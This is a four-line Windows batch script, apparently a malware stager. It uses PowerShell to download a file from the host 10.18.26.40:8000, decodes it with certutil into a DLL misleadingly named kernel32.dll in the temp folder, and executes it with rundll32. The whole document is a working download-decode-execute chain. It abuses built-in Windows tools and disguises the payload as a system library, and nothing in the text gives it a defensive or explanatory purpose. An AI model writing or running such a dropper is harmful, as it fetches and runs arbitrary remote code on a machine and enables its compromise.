@echo off
powershell -command "Invoke-WebRequest -Uri '10.18.26.40:8000/dll.txt' -OutFile '%temp%\dll.txt'"
certutil -decode "%temp%\dll.txt" "%temp%\kernel32.dll"
rundll32.exe "%temp%\kernel32.dll",DllMain


